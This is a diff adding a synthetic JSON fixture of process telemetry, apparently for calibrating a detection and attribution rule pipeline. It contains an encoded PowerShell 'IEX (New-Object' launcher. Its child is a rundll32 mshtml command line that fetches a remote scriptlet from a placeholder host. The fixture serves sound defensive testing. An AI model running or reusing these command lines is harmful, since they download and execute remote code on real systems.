@@ -1,0 +1,39 @@
+{
+  "fixture_id": "v1-cal-unresolved-actor",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-cal-unresolved-actor' (role=calibration). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "cf1",
+      "raw_record": {
+        "record_id": "rec-cf1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-cf1"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "entity_id": "cf1",
+        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+      },
+      "host": {
+        "id": "host-cal-unresolved"
+      }
+    },
+    {
+      "scenario_id": "cf2",
+      "raw_record": {
+        "record_id": "rec-cf2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-cf2"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "entity_id": "cf2",
+        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://example.invalid/x.sct')",
+        "parent_entity_id": "cf1"
+      },
+      "host": {
+        "id": "host-cal-unresolved"
+      }
+    }
+  ]
+}
